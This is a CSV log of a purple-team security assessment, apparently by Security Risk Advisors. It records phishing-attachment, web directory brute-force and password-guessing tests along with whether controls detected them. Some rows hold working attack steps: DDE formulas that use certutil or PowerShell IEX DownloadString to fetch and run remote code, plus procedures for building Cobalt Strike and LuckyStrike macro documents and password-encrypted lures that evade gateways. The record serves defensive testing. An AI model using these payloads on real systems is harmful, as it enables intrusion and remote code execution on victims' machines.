Enterprise Purple – 2019 Q1,Email With Malicious Attachments,Delivery,12 - Macro - MMG WMI Exe,T1566.001,,Phishing Payload,Completed,Blocked,TBD,No,TBD,,1) Malicious email delivery alerted by email gateway (ideally blocked/quarantined too with attachment stripped and URLs rewritten),,,Email Gateway,Slap Fight,2019-01-06T22:54:57.197Z,1546815297197,2019-01-07T00:44:04.197Z,1546821844197,2019-01-07T01:42:00.197Z,1546825320197,Security Risk Advisors,,Send phishing email to victim containing attachment with malicious document.  This is intended to test the mail gateway (and sandbox analysis) in isolation.,python MMG.py [config] [output],,Low,Low,External,Low,,,,Cobalt Strike
Enterprise Purple – 2019 Q1,Email With Malicious Attachments,Delivery,20 - Password-protected Office Doc - Standard CS payload,T1566.001,,Phishing Payload,Completed,NotDetected,TBD,TBD,Yes,,1) Malicious email delivery alerted by email gateway (ideally blocked/quarantined too with attachment stripped and URLs rewritten),,,Email Gateway,,2019-01-05T19:21:50.197Z,1546716110197,2019-01-05T19:27:40.197Z,1546716460197,2019-01-05T20:12:17.197Z,1546719137197,Security Risk Advisors,,Send phishing email to victim containing attachment with malicious link.  This is intended to test the mail gateway (and sandbox analysis) in isolation.,"Generate standard office payload using cobalt strike from Attacks -> Packages -> MS Office Macro

When saving the malicious macro, encrypt the document with a password by: Save -> Info -> Protect Document -> Encrypt With Password",,Low,Low,External,Low,,,,Manual Techniques
Enterprise Purple – 2019 Q1,Email With Malicious Attachments,Delivery,17 - Macro - LuckyStrike PowerShell CellEmbed + Sandbox Evasion,T1566.001,,Phishing Payload,Completed,Blocked,TBD,No,TBD,,1) Malicious email delivery alerted by email gateway (ideally blocked/quarantined too with attachment stripped and URLs rewritten),,,Email Gateway,Slap Fight,2019-01-07T09:09:35.197Z,1546852175197,2019-01-07T10:31:46.197Z,1546857106197,2019-01-28T21:56:06.744Z,1548712566744,Security Risk Advisors,,Send phishing email to victim containing attachment with malicious document.  This is intended to test the mail gateway (and sandbox analysis) in isolation.,"Run as admin:
.\luckystrike.ps1

Catalog Options -> Add Payload to Catalog (Name is required, everything else can be skipped) -> Powershell Script

Main Menu -> Payload Options -> xls  -> Cell Embedded

File Options -> File options -> Payload options  -> Generate New File",,Low,Low,External,Low,,,,Cobalt Strike
Enterprise Purple – 2019 Q1,Email With Malicious Attachments,Delivery,5 - Macro - WScript PowerShell,T1566.001,,Phishing Payload,Completed,Blocked,TBD,No,TBD,,1) Malicious email delivery alerted by email gateway (ideally blocked/quarantined too with attachment stripped and URLs rewritten),,,Email Gateway,Slap Fight,2019-01-06T06:55:04.197Z,1546757704197,2019-01-06T07:16:06.197Z,1546758966197,2019-01-06T08:43:54.197Z,1546764234197,Security Risk Advisors,,Send phishing email to victim containing attachment with malicious link.  This is intended to test the mail gateway (and sandbox analysis) in isolation.,Copy macro template into office document,,Low,Low,External,Low,,,,"Manual Techniques,Cobalt Strike"
Enterprise Purple – 2019 Q1,Email With Malicious Attachments,Delivery,9 - Macro - LuckyStrike PowerShell CellEmbed,T1566.001,,Phishing Payload,Completed,Blocked,TBD,No,Yes,,1) Malicious email delivery alerted by email gateway (ideally blocked/quarantined too with attachment stripped and URLs rewritten),,,Email Gateway,Slap Fight,2019-01-06T18:57:38.197Z,1546801058197,2019-01-06T20:45:14.197Z,1546807514197,2019-01-28T21:54:08.092Z,1548712448092,Security Risk Advisors,,Send phishing email to victim containing attachment with malicious link.  This is intended to test the mail gateway (and sandbox analysis) in isolation.,"Run as admin:
.\luckystrike.ps1

Catalog Options -> Add Payload to Catalog (Name is required, everything else can be skipped) -> Powershell Script

Main Menu -> Payload Options -> xls  -> Cell Embedded

File Options -> File options -> Payload options  -> Generate New File",,Low,Low,External,Low,,,,Cobalt Strike
Enterprise Purple – 2019 Q1,Email With Malicious Attachments,Delivery,21 - Link Inside PDF,T1566.001,,Phishing Payload,Completed,NotDetected,TBD,TBD,Yes,,1) Malicious email delivery alerted by email gateway (ideally blocked/quarantined too with attachment stripped and URLs rewritten),,,Email Gateway,,2019-01-05T21:00:01.197Z,1546722001197,2019-01-05T21:02:06.197Z,1546722126197,2019-01-05T21:03:05.197Z,1546722185197,Security Risk Advisors,,Send phishing email to victim containing attachment with malicious document.  This is intended to test the mail gateway (and sandbox analysis) in isolation.,Create a PDF with a malicious link in it and send using email,,Low,Low,External,Low,,,,Manual Techniques
Enterprise Purple – 2019 Q1,Email With Malicious Attachments,Delivery,19 - Encrypted Archive - DDE,T1566.001,,Phishing Payload,Completed,NotDetected,TBD,TBD,Yes,,1) Malicious email delivery alerted by email gateway (ideally blocked/quarantined too with attachment stripped and URLs rewritten),,,Email Gateway,,2019-01-05T16:34:00.197Z,1546706040197,2019-01-05T17:55:14.197Z,1546710914197,2019-01-05T19:08:02.197Z,1546715282197,Security Risk Advisors,,Send phishing email to victim containing attachment with malicious link.  This is intended to test the mail gateway (and sandbox analysis) in isolation.,Zip and encrypt the dde office document,,Low,Low,External,Low,,,,Manual Techniques
Enterprise Purple – 2019 Q1,Email With Malicious Attachments,Delivery,4 - Macro - Cobalt Strike Standard (URL Rewrite Update),T1566.001,,Phishing Payload,Completed,Blocked,TBD,TBD,TBD,,1) Malicious email delivery alerted by email gateway (ideally blocked/quarantined too with attachment stripped and URLs rewritten),,,Email Gateway,Slap Fight,2019-01-06T03:47:01.197Z,1546746421197,2019-01-06T04:28:31.197Z,1546748911197,2019-01-06T06:53:01.197Z,1546757581197,Security Risk Advisors,,Send phishing email to victim containing attachment with malicious document.  This is intended to test the mail gateway (and sandbox analysis) in isolation.,,,Low,Low,External,Low,,,,Cobalt Strike
Enterprise Purple – 2019 Q1,Email With Malicious Attachments,Delivery,1 - Macro - Cobalt Strike Standard,T1566.001,,Phishing Payload,Completed,Blocked,TBD,No,TBD,,1) Malicious email delivery alerted by email gateway (ideally blocked/quarantined too with attachment stripped and URLs rewritten),,,Email Gateway,Slap Fight,2019-01-04T23:01:12.197Z,1546642872197,2019-01-04T23:56:37.197Z,1546646197197,2019-01-05T00:23:00.197Z,1546647780197,Security Risk Advisors,,Send phishing email to victim containing link with malicious document.  This is intended to test the mail gateway (and sandbox analysis) in isolation.,"Attacks --> Packages --> MS Office Macro
Copy code to office document",,Low,Low,External,Low,,,,Cobalt Strike
Enterprise Purple – 2019 Q1,Email With Malicious Attachments,Delivery,6 - Macro - WScript EXE,T1566.001,,Phishing Payload,Completed,Blocked,TBD,TBD,TBD,,1) Malicious email delivery alerted by email gateway (ideally blocked/quarantined too with attachment stripped and URLs rewritten),,,Email Gateway,Slap Fight,2019-01-06T10:46:08.197Z,1546771568197,2019-01-06T11:20:37.197Z,1546773637197,2019-01-06T12:38:06.197Z,1546778286197,Security Risk Advisors,,Send phishing email to victim containing attachment with malicious link.  This is intended to test the mail gateway (and sandbox analysis) in isolation.,Copy macro template into office document,,Low,Low,External,Low,,,,Manual Techniques
Enterprise Purple – 2019 Q1,Email With Malicious Attachments,Delivery,18 - Encrypted Archive - Macro,T1566.001,,Phishing Payload,Completed,NotDetected,TBD,TBD,Yes,,1) Malicious email delivery alerted by email gateway (ideally blocked/quarantined too with attachment stripped and URLs rewritten),,,Email Gateway,,2019-01-05T13:24:37.197Z,1546694677197,2019-01-05T14:57:07.197Z,1546700227197,2019-01-05T15:46:36.197Z,1546703196197,Security Risk Advisors,,Send phishing email to victim containing attachment with malicious link.  This is intended to test the mail gateway (and sandbox analysis) in isolation.,Zip or rar and encrypt malicious document,,Low,Low,External,Low,,,,Manual Techniques
Enterprise Purple – 2019 Q1,Email With Malicious Attachments,Delivery,2 - Macro - CobaltStrike Standard (MMG),T1566.001,,Phishing Payload,Completed,Blocked,TBD,No,TBD,,1) Malicious email delivery alerted by email gateway (ideally blocked/quarantined too with attachment stripped and URLs rewritten),,,Email Gateway,Slap Fight,2019-01-05T01:15:28.197Z,1546650928197,2019-01-05T02:47:41.197Z,1546656461197,2019-01-05T03:06:58.197Z,1546657618197,Security Risk Advisors,,Send phishing email to victim containing attachment with malicious link.  This is intended to test the mail gateway (and sandbox analysis) in isolation.,python MMG.py [config] [output],,Low,Low,External,Low,,,,Cobalt Strike
Enterprise Purple – 2019 Q1,Email With Malicious Attachments,Delivery,22 - Link Inside Office Document,T1566.001,,Phishing Payload,Completed,NotDetected,TBD,TBD,Yes,,1) Malicious email delivery alerted by email gateway (ideally blocked/quarantined too with attachment stripped and URLs rewritten),,,Email Gateway,,2019-01-05T21:09:18.197Z,1546722558197,2019-01-05T22:00:14.197Z,1546725614197,2019-01-05T22:02:10.197Z,1546725730197,Security Risk Advisors,,Send phishing email to victim containing attachment with malicious document.  This is intended to test the mail gateway (and sandbox analysis) in isolation.,Send a office document with a malicious link in it,,Low,Low,External,Low,,,,Manual Techniques
Enterprise Purple – 2019 Q1,Email With Malicious Attachments,Delivery,13 - DDE - Exe,T1566.001,,Phishing Payload,Completed,Blocked,TBD,No,Yes,,1) Malicious email delivery alerted by email gateway (ideally blocked/quarantined too with attachment stripped and URLs rewritten),,,Email Gateway,Slap Fight,2019-01-07T02:40:27.197Z,1546828827197,2019-01-07T03:38:25.197Z,1546832305197,2019-01-28T21:55:07.246Z,1548712507246,Security Risk Advisors,,Send phishing email to victim containing attachment with malicious link.  This is intended to test the mail gateway (and sandbox analysis) in isolation.,=cmd|'/c certutil https://<exe url> <local file location> && <local file location> && del <local file location>'!A1,,Low,Low,External,Low,,,,"Manual Techniques,Cobalt Strike"
Enterprise Purple – 2019 Q1,Email With Malicious Attachments,Delivery,7 - Macro - WScript PowerShell XOR,T1566.001,,Phishing Payload,Completed,Blocked,TBD,No,TBD,,1) Malicious email delivery alerted by email gateway (ideally blocked/quarantined too with attachment stripped and URLs rewritten),,,Email Gateway,Slap Fight,2019-01-06T12:38:15.197Z,1546778295197,2019-01-06T13:02:22.197Z,1546779742197,2019-01-06T14:34:07.197Z,1546785247197,Security Risk Advisors,,Send phishing email to victim containing attachment with malicious link.  This is intended to test the mail gateway (and sandbox analysis) in isolation.,Copy macro template into office document,,Low,Low,External,Low,,,,Cobalt Strike
Enterprise Purple – 2019 Q1,Email With Malicious Attachments,Delivery,11 - DDE - PowerShell,T1566.001,,Phishing Payload,Completed,Blocked,TBD,No,Yes,,1) Malicious email delivery alerted by email gateway (ideally blocked/quarantined too with attachment stripped and URLs rewritten),,,Email Gateway,Slap Fight,2019-01-05T03:59:34.197Z,1546660774197,2019-01-05T04:54:32.197Z,1546664072197,2019-01-28T21:54:37.687Z,1548712477687,Security Risk Advisors,,Send phishing email to victim containing attachment with malicious link.  This is intended to test the mail gateway (and sandbox analysis) in isolation.,"=cmd|'/c powershell -Exec ByPass -nop -noexit -c IEX ((New-Object Net.WebClient).DownloadString(\""http://<location of payload>\""))'!A1",,Low,Low,External,Low,,,,"Manual Techniques,Cobalt Strike"
Enterprise Purple – 2019 Q1,External Web App Profiling,Reconnaissance,Directory Brute Force - Enterprise Portal,,,Web App Discovery,Completed,NotDetected,TBD,TBD,TBD,,"1) An alert is configured on the external WAF, IDS/IPS, or firewall when a large number of HTTP requests are made to one or more external targets.,2) Web application logs are ingested into the SIEM and alerts triggered for suspicious activity (e.g. brute force attacks, large number of 400/500 status codes)",,,"Firewall,SIEM",,2019-01-03T16:19:32.197Z,1546532372197,2019-01-03T17:50:54.197Z,1546537854197,2019-01-03T19:40:35.197Z,1546544435197,Security Risk Advisors,,Enumerate files and directories on prominent external web apps.,,,High,Low,External,Low,,,,BurpSuite
Enterprise Purple – 2019 Q1,External Web App Profiling,Reconnaissance,Directory Brute Force - Customer Web App,,,Web App Discovery,Completed,Detected,Low,TBD,TBD,,"1) An alert is configured on the external WAF, IDS/IPS, or firewall when a large number of HTTP requests are made to one or more external targets.,2) Web application logs are ingested into the SIEM and alerts triggered for suspicious activity (e.g. brute force attacks, large number of 400/500 status codes)",,,"Firewall,SIEM,WAF",Gunbird,2019-01-03T14:27:10.197Z,1546525630197,2019-01-03T15:30:45.197Z,1546529445197,2019-01-28T22:39:56.503Z,1548715196503,Security Risk Advisors,,Enumerate files and directories on prominent external web apps.,,,High,Low,External,Low,,,,BurpSuite
Enterprise Purple – 2019 Q1,External Web App Profiling,Reconnaissance,Directory Brute Force - Sensitive API,,,Web App Discovery,Completed,Detected,Low,TBD,TBD,,"1) An alert is configured on the external WAF, IDS/IPS, or firewall when a large number of HTTP requests are made to one or more external targets.,2) Web application logs are ingested into the SIEM and alerts triggered for suspicious activity (e.g. brute force attacks, large number of 400/500 status codes)",,,"Firewall,SIEM,WAF",Gunbird,2019-01-03T19:50:10.197Z,1546545010197,2019-01-03T21:41:21.197Z,1546551681197,2019-01-28T22:40:18.776Z,1548715218776,Security Risk Advisors,,Enumerate files and directories on prominent external web apps.,,,High,Low,External,Low,,,,BurpSuite
Enterprise Purple – 2019 Q1,External Password Attacks,Exploitation,Remote Access Portal - SSO Login,T1190,,Password Guessing,Completed,Detected,High,TBD,TBD,,"1) Large number of authentication requests detected by WAF, IDS/IPS, or firewall.,2) Application logs are sent to a SIEM for further analysis, correlation and alerting.",,,"SIEM,WAF","MUSHA,Progear",2019-01-03T22:43:25.197Z,1546555405197,2019-01-03T23:19:50.197Z,1546557590197,2019-01-28T21:49:36.680Z,1548712176680,Security Risk Advisors,,"Brute force single password, large list of potential users","Capture login request
Brute force with intruder",,High,High,External,Low,,,,BurpSuite
Enterprise Purple – 2019 Q1,External Password Attacks,Exploitation,Simultaneous VPN Logins from different Geo's,T1078,,Suspicious Logins,Completed,Detected,High,TBD,TBD,,"1) VPN authentication logs are sent to a SIEM for further analysis, correlation and alerting",,,"Firewall,SIEM",Progear,2019-01-04T09:18:18.197Z,1546593498197,2019-01-04T09:50:07.197Z,1546595407197,2019-01-28T21:50:06.154Z,1548712206154,Security Risk Advisors,,Login from two distinct geo's to test detection capabilities.,,,Medium,Medium,External,Low,,,,"Manual Techniques,BurpSuite"
Enterprise Purple – 2019 Q1,External Password Attacks,Exploitation,Remote Access Portal - Office 365,T1190,,Password Guessing,Completed,Detected,High,TBD,TBD,,"1) Large number of authentication requests detected by WAF, IDS/IPS, or firewall.,2) Application logs are sent to a SIEM for further analysis, correlation and alerting.",,,"SIEM,WAF",Progear,2019-01-04T02:00:14.197Z,1546567214197,2019-01-04T03:42:56.197Z,1546573376197,2019-01-28T21:49:50.991Z,1548712190991,Security Risk Advisors,,Brute force with large list of potential users,,,High,High,External,Low,,,,BurpSuite
Enterprise Purple – 2019 Q1,External Password Attacks,Exploitation,Customer Portal Brute Force,T1190,,Password Guessing,Completed,NotDetected,TBD,TBD,TBD,,"1) Large number of authentication requests detected by WAF, IDS/IPS, or firewall.,2) Application logs are sent to a SIEM for further analysis, correlation and alerting.",,,"Firewall,SIEM,WAF",,2019-01-04T05:03:28.197Z,1546578208197,2019-01-04T07:03:12.197Z,1546585392197,2019-01-04T07:19:39.197Z,1546586379197,Security Risk Advisors,,Brute force with large list of potential users,,,High,High,External,Low,,,,BurpSuite
